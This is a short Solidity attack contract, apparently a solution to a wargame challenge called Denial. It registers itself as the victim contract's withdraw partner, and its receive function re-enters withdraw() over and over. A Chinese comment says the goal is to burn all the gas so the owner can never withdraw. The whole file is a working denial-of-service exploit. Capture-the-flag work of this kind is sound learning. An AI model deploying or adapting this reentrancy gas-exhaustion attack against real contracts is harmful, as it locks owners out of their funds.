// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Denial.sol";

contract AttackDenial {
    Denial denial;

    constructor(Denial _denial) {
        denial = _denial;
    }

    function attack() public {
        denial.setWithdrawPartner(address(this));
    }

    receive() external payable {
        // 反覆重入把 gas 耗光讓 Owner 無法 withdraw
        denial.withdraw();
    }
}
